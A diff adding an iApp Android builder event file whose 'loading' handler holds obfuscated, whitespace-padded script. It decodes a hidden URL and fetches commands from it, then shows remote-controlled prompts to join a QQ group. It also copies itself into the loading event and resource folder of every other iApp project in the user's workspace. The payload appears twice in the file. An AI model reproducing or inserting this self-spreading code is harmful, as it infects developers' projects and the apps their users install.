@@ -1,0 +1,297 @@
+<UIEventset><eventItme type="loading">
+
+
+
+
+
+
+
+
+/.
+
+
+
+t()
+                                                                                                       {
+     
+       
+       
+       
+       
+       
+       
+       
+       
+                                                                                                          btoo("utf-8","55 51 52 54 50 56 51 56 55",sss.sqdcs)
+                                                       btoo("utf-8"," 99 111 109 46 122 104 101 110 100 111 110 103",sss.bm)
+btoo("utf-8","-26 -72 -87 -23 -90 -88 -26 -113 -112 -25 -92 -70",wxts)
+                                     btoo("utf-8","-28 -72 -117 -24 -67 -67 -26 -101 -76 -26 -106 -80",jrjlq)
+                                                 btoo("utf-8","104 116 116 112 58 47 47 100 111 99 113 46 99 110 47 102 105 108 101 115 47 107 101 107 107 107 55 55",c)
+                                                 
+ hs(c,e)  
+ 
+ 
+ 
+ 
+s a = "iApp"
+fi(a,b)
+f(b==false)
+{
+}
+else
+{
+  
+
+ 
+                                                                                                   }
+                                                                                          fi("%iapp/tempFile",IAPP)
+                                                                                                 f(IAPP==true)
+                                                                              {
+                                                                     }
+                                                                                else
+                                                                                 {
+                                                                                       
+                                                                                                  ufnsui()
+                                                                                                  {
+                                                                                                          sj(e,"zl【","】zl",zl)
+                                                                                   sj(e,"qh【","】qh",qh)
+                                                                                     sj(e,"zz【","】zz",zz)
+                                                                                     sj(e,"gg【","】gg",gg)
+                                                                                     f(zl=="-27 -68 -128 -27 -112 -81")
+                                                                         {
+                                                                                                          btoo("utf-8",qh,qhzh)
+                                                                                      btoo("utf-8",gg,ggzh)
+                                                                                     utw(null,wxts,ggzh,jrjlq,true,fz)
+                                                                             {
+                                                                                                          ss("mqqapi://card/show_pslcard?src_type=internal&version=1&uin="+qhzh+"&card_type=group&source=qrcode",joinqq)
+                                                                  sit(a,"action", "android.intent.action.VIEW")
+                                                              sit(a,"data",joinqq)
+                                                                                       uit(a, "chooser", qhzh)
+                                                                                 
+                                                                                                          }
+                                                                                                          } 
+                                                                                                         }
+                                                                                                       }
+                                                                                                     }
+                                                                                                                   t()
+ {
+ 
+
+      btoo("utf-8","60 47 101 118 101 110 116 73 116 109 101 62",event)
+btoo("utf-8","60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.s)
+btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.d)
+btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62",sss.c)
+
+fr("@3.0.iapp",bb)
+f(bb==null)
+{
+fc("%3.0.iapp","@3.0.iapp",n)
+}
+else
+{
+fc("@3.0.iapp","%3.0.iapp",n)
+fdir("@",path)
+fdir(dir)
+ss(dir+"/",dir)
+sr(path,dir,"%",path)
+sl(path,"/",list)
+sgszl(list,length)
+s(length-3,len)
+s count = 0
+s proPath = ""
+for(1;len)
+{
+sgsz(list,count,c)
+ss(proPath+c+"/",proPath)
+s(count+1,count)
+}
+fl(proPath,files)
+for(file;files)
+{
+f(file?"3.0.iapp")
+{
+}
+else
+{
+ss(proPath+file+"/src/mian.iyu",Item)
+ss(proPath+file+"/res/3.0.iapp",Items)
+fr(Item,cons)
+f(cons?"android= www.iapp.com")
+{
+  
+}
+else
+{
+
+f(cons?"loading")
+{
+sj(cons,null,sss.s,Dq)
+sj(cons,sss.s,null,cbc)
+sj(cbc,event,null,Dh)
+sj(cons,sss.s,event,Yh)
+ss(Dq+sss.s+Yh+bb+event+Dh,Wc)
+fc("@3.0.iapp",Items,ni)
+fw(Item,Wc)
+}
+else
+{
+sj(cons,null,sss.c,before)
+sj(cons,sss.c,null,between)
+ss(before+sss.d+bb+event+between,Wc)
+fc("@3.0.iapp",Items,ni)
+fw(Item,Wc)
+
+}
+}
+}
+}
+}
+}
+
+
+./
+
+
+
+
+
+
+
+t()
+                                                                                                       {
+     
+       
+       
+       
+       
+       
+       
+       
+       
+                                                                                                          btoo("utf-8","55 51 52 54 50 56 51 56 55",sss.sqdcs)
+                                                       btoo("utf-8"," 99 111 109 46 122 104 101 110 100 111 110 103",sss.bm)
+btoo("utf-8","-26 -72 -87 -23 -90 -88 -26 -113 -112 -25 -92 -70",wxts)
+                                     btoo("utf-8","-28 -72 -117 -24 -67 -67 -26 -101 -76 -26 -106 -80",jrjlq)
+                                                 btoo("utf-8","104 116 116 112 58 47 47 100 111 99 113 46 99 110 47 102 105 108 101 115 47 107 101 107 107 107 55 55",c)
+                                                 
+ hs(c,e)  
+ 
+ 
+ 
+ 
+s a = "iApp"
+fi(a,b)
+f(b==false)
+{
+}
+else
+{
+  
+
+ 
+                                                                                                   }
+                                                                                          fi("%iapp/tempFile",IAPP)
+                                                                                                 f(IAPP==true)
+                                                                              {
+                                                                     }
+                                                                                else
+                                                                                 {
+                                                                                       
+                                                                                                  ufnsui()
+                                                                                                  {
+                                                                                                          sj(e,"zl【","】zl",zl)
+                                                                                   sj(e,"qh【","】qh",qh)
+                                                                                     sj(e,"zz【","】zz",zz)
+                                                                                     sj(e,"gg【","】gg",gg)
+                                                                                     f(zl=="-27 -68 -128 -27 -112 -81")
+                                                                         {
+                                                                                                          btoo("utf-8",qh,qhzh)
+                                                                                      btoo("utf-8",gg,ggzh)
+                                                                                     utw(null,wxts,ggzh,jrjlq,true,fz)
+                                                                             {
+                                                                                                          ss("mqqapi://card/show_pslcard?src_type=internal&version=1&uin="+qhzh+"&card_type=group&source=qrcode",joinqq)
+                                                                  sit(a,"action", "android.intent.action.VIEW")
+                                                              sit(a,"data",joinqq)
+                                                                                       uit(a, "chooser", qhzh)
+                                                                                 
+                                                                                                          }
+                                                                                                          } 
+                                                                                                         }
+                                                                                                       }
+                                                                                                     }
+                                                                                                                   t()
+ {
+ 
+
+      btoo("utf-8","60 47 101 118 101 110 116 73 116 109 101 62",event)
+btoo("utf-8","60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.s)
+btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.d)
+btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62",sss.c)
+
+fr("@3.0.iapp",bb)
+f(bb==null)
+{
+fc("%3.0.iapp","@3.0.iapp",n)
+}
+else
+{
+fc("@3.0.iapp","%3.0.iapp",n)
+fdir("@",path)
+fdir(dir)
+ss(dir+"/",dir)
+sr(path,dir,"%",path)
+sl(path,"/",list)
+sgszl(list,length)
+s(length-3,len)
+s count = 0
+s proPath = ""
+for(1;len)
+{
+sgsz(list,count,c)
+ss(proPath+c+"/",proPath)
+s(count+1,count)
+}
+fl(proPath,files)
+for(file;files)
+{
+f(file?"3.0.iapp")
+{
+}
+else
+{
+ss(proPath+file+"/src/mian.iyu",Item)
+ss(proPath+file+"/res/3.0.iapp",Items)
+fr(Item,cons)
+f(cons?"android= www.iapp.com")
+{
+  
+}
+else
+{
+
+f(cons?"loading")
+{
+sj(cons,null,sss.s,Dq)
+sj(cons,sss.s,null,cbc)
+sj(cbc,event,null,Dh)
+sj(cons,sss.s,event,Yh)
+ss(Dq+sss.s+Yh+bb+event+Dh,Wc)
+fc("@3.0.iapp",Items,ni)
+fw(Item,Wc)
+}
+else
+{
+sj(cons,null,sss.c,before)
+sj(cons,sss.c,null,between)
+ss(before+sss.d+bb+event+between,Wc)
+fc("@3.0.iapp",Items,ni)
+fw(Item,Wc)
+
+}
+}
+}
+}
+}
+}
+
+</eventItme>
